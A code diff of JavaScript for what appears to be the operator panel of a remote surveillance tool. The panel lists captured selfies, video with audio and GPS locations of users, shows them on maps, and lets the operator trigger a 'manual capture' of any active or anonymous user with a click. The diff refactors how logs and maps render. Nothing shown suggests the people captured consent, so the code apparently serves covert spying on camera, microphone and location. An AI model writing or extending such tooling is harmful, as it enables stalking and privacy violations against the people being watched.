@@ -5,83 +5,16 @@ fetch(`${BACKEND_URL}/api/capture-data`)
     const userSet = new Set();
     const userSelect = document.getElementById("user-select");
 
-    container.innerHTML = ""; // Clear previous logs if any
+    container.innerHTML = "";
     userSelect.innerHTML = `
       <option value="">-- Select a user --</option>
       <option value="__anonymous__">Anonymous User</option>
     `;
 
-    data.forEach((log, index) => {
-      // Collect unique usernames
+    data.forEach((log) => {
       if (log.username) userSet.add(log.username);
-
-      // Create log card
-      const card = document.createElement("div");
-      card.className = "log-card";
-
-      const username = log.username || "—";
-      const time = new Date(log.createdAt).toLocaleString();
-
-      card.innerHTML = `
-         <div class="log-header">
-    <span>👤 Triggered By: ${log.triggeredBy}</span>
-    <span>🕒 ${time}</span>
-    <span>👥 Username: ${username}</span>
-  </div>
-
-        <div class="media">
-          <div><strong>📸 Selfie:</strong><br/><img src="${BACKEND_URL}/${log.selfiePath}" /></div>
-          <div>
-            <strong>🎥 Video with Audio:</strong><br/>
-            <video id="video-${index}" controls style="max-width: 250px; border-radius: 8px;" muted>
-              <source src="${BACKEND_URL}/${log.videoPath}" type="video/webm">
-            </video>
-            <audio id="audio-${index}" src="${BACKEND_URL}/${log.audioPath}" style="display: none;"></audio>
-          </div>
-        </div>
-
-        <div id="map-${index}" class="map"></div>
-      `;
-
-      container.appendChild(card);
-
-      // Sync video and audio
-      const video = document.getElementById(`video-${index}`);
-      const audio = document.getElementById(`audio-${index}`);
-
-      if (audio?.src) {
-        video.addEventListener("play", () => {
-          audio.currentTime = video.currentTime;
-          audio.play().catch(e => console.warn("🔇 Audio play blocked:", e));
-        });
-
-        video.addEventListener("pause", () => audio.pause());
-        video.addEventListener("seeking", () => audio.currentTime = video.currentTime);
-        video.addEventListener("volumechange", () => {
-          audio.volume = video.volume;
-          audio.muted = video.muted;
-        });
-      }
-
-      // Google Maps
-      if (log.location?.lat && log.location?.lon) {
-        const mapDiv = document.getElementById(`map-${index}`);
-        const position = { lat: log.location.lat, lng: log.location.lon };
-
-        const map = new google.maps.Map(mapDiv, {
-          zoom: 13,
-          center: position,
-        });
-
-        new google.maps.Marker({
-          position,
-          map,
-          title: "Captured Location"
-        });
-      }
     });
 
-    // Populate dropdown
     [...userSet].forEach(username => {
       const opt = document.createElement("option");
       opt.value = username;
@@ -95,7 +28,6 @@ fetch(`${BACKEND_URL}/api/capture-data`)
       "<p style='color:red;'>❌ Error loading logs</p>";
   });
 
-// 🔘 Trigger capture for selected user
 function triggerSelectedUser() {
   const typedUsername = document.getElementById("manual-username").value.trim();
   const selectedUsername = document.getElementById("user-select").value;
@@ -110,12 +42,11 @@ function triggerSelectedUser() {
   triggerForUser(finalUsername);
 }
 
-// 📡 Trigger API call
 function triggerForUser(username) {
   fetch(`${BACKEND_URL}/api/manual-capture`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ username }) // can be null for anonymous
+    body: JSON.stringify({ username })
   })
     .then(res => res.json())
     .then(data => {
@@ -135,8 +66,7 @@ fetch(`${BACKEND_URL}/api/capture-data`)
   .then(data => {
     allLogs = data;
     renderLogs(allLogs);
-    populateUserDropdown(allLogs); // if needed for admin trigger
-  })
+  });
 
 function applyFilters() {
   const username = document.getElementById("filter-username").value.toLowerCase();
@@ -173,33 +103,50 @@ function renderLogs(logs) {
     const time = new Date(log.createdAt).toLocaleString();
     const username = log.username || "—";
 
-    card.innerHTML = `
-      <div class="log-header">
-    <span>👤 Triggered By: ${log.triggeredBy}</span>
-    <span>🕒 ${time}</span>
-    <span>👥 Username: ${username}</span>
-    <button onclick="deleteLog('${log._id}')">🗑️ Delete</button>
-    <button onclick="downloadLog('${log._id}')">⬇️ Download ZIP</button>
-  </div>
+    const videoId = `video-${index}`;
+    const audioId = `audio-${index}`;
+    const mapId = `map-${index}`;
 
-      <div class="media">
-        <div><strong>📸 Selfie:</strong><br/><img src="${BACKEND_URL}/${log.selfiePath}" /></div>
-        <div>
-          <strong>🎥 Video with Audio:</strong><br/>
-          <video id="video-${index}" controls muted style="max-width: 250px;">
-            <source src="${BACKEND_URL}/${log.videoPath}" type="video/webm" />
-          </video>
-          <audio id="audio-${index}" src="${BACKEND_URL}/${log.audioPath}" style="display:none;"></audio>
-        </div>
-      </div>
+    const mapButton = document.createElement("button");
+    mapButton.textContent = "🗺️ Show Map";
+    mapButton.onclick = () => loadMap(index, log.location.lat, log.location.lon);
 
-      <div id="map-${index}" class="map" style="height: 250px; margin-top: 10px;"></div>
+    const logHeader = document.createElement("div");
+    logHeader.className = "log-header";
+    logHeader.innerHTML = `
+      <span>👤 Triggered By: ${log.triggeredBy}</span>
+      <span>🕒 ${time}</span>
+      <span>👥 Username: ${username}</span>
+      <button onclick="deleteLog('${log._id}')">🗑️ Delete</button>
+      <button onclick="downloadLog('${log._id}')">⬇️ Download ZIP</button>
     `;
 
+    const mediaSection = document.createElement("div");
+    mediaSection.className = "media";
+    mediaSection.innerHTML = `
+      <div><strong>📸 Selfie:</strong><br/><img src="${BACKEND_URL}/${log.selfiePath}" /></div>
+      <div>
+        <strong>🎥 Video with Audio:</strong><br/>
+        <video id="${videoId}" controls muted style="max-width: 250px;">
+          <source src="${BACKEND_URL}/${log.videoPath}" type="video/webm" />
+        </video>
+        <audio id="${audioId}" src="${BACKEND_URL}/${log.audioPath}" style="display:none;"></audio>
+      </div>
+    `;
+
+    const mapContainer = document.createElement("div");
+    mapContainer.id = mapId;
+    mapContainer.className = "map";
+    mapContainer.style = "height: 250px; margin-top: 10px; display: none;";
+
+    card.appendChild(logHeader);
+    card.appendChild(mediaSection);
+    card.appendChild(mapButton);
+    card.appendChild(mapContainer);
     container.appendChild(card);
 
-    const video = document.getElementById(`video-${index}`);
-    const audio = document.getElementById(`audio-${index}`);
+    const video = document.getElementById(videoId);
+    const audio = document.getElementById(audioId);
 
     if (audio?.src) {
       video.addEventListener("play", () => {
@@ -213,33 +160,46 @@ function renderLogs(logs) {
         audio.muted = video.muted;
       });
     }
-
-    // Google Map
-    if (log.location?.lat && log.location?.lon) {
-      const position = { lat: log.location.lat, lng: log.location.lon };
-      const map = new google.maps.Map(document.getElementById(`map-${index}`), {
-        center: position,
-        zoom: 13
-      });
-      new google.maps.Marker({ position, map });
-    }
   });
-  
-  updateActiveUsers();
 }
+
+let lastClickedUser = null;
 
 function updateActiveUsers() {
   fetch(`${BACKEND_URL}/api/active-users`)
     .then(res => res.json())
     .then(data => {
-      const list = data.activeUsers?.length ? data.activeUsers.join(", ") : "None";
-      document.getElementById("active-users").textContent = list;
+      const container = document.getElementById("active-users");
+      container.innerHTML = "";
+
+      if (!data.activeUsers?.length) {
+        container.textContent = "None";
+        return;
+      }
+
+      data.activeUsers.forEach(user => {
+        const span = document.createElement("span");
+        span.textContent = user;
+        span.style.cursor = "pointer";
+        span.style.marginRight = "10px";
+        span.style.textDecoration = "underline";
+        span.style.color = user === lastClickedUser ? "green" : "blue";
+        span.style.fontWeight = user === lastClickedUser ? "bold" : "normal";
+        span.title = "Click to trigger manual capture";
+
+        span.onclick = () => {
+          lastClickedUser = user;
+          triggerForUser(user);
+          updateActiveUsers();
+        };
+
+        container.appendChild(span);
+      });
     })
     .catch(err => console.error("Active users fetch error:", err));
 }
 
-// Every 10 seconds
-setInterval(updateActiveUsers, 20000); // auto refresh every 20s
+setInterval(updateActiveUsers, 15000);
 
 function deleteLog(id) {
   if (!confirm("Are you sure you want to delete this log?")) return;
@@ -258,8 +218,6 @@ function deleteLog(id) {
       alert("Failed to delete log");
     });
 }
-
-
 
 document.getElementById("delete-all-button").addEventListener("click", () => {
   if (!confirm("⚠️ Are you sure you want to delete ALL logs and media files? This cannot be undone.")) return;
@@ -282,9 +240,29 @@ document.getElementById("delete-all-button").addEventListener("click", () => {
 function downloadLog(id) {
   const link = document.createElement("a");
   link.href = `${BACKEND_URL}/api/capture-data/${id}/download`;
-  link.download = `capture-log-${id}.zip`; // optional: let server set filename
+  link.download = `capture-log-${id}.zip`;
   link.style.display = "none";
   document.body.appendChild(link);
   link.click();
   document.body.removeChild(link);
+}
+
+function loadMap(index, lat, lon) {
+  const mapDiv = document.getElementById(`map-${index}`);
+  if (!mapDiv) return;
+
+  if (mapDiv.dataset.loaded === "true") {
+    mapDiv.style.display = mapDiv.style.display === "none" ? "block" : "none";
+    return;
+  }
+
+  const position = { lat, lng: lon };
+  const map = new google.maps.Map(mapDiv, {
+    center: position,
+    zoom: 13
+  });
+  new google.maps.Marker({ position, map });
+
+  mapDiv.dataset.loaded = "true";
+  mapDiv.style.display = "block";
 }
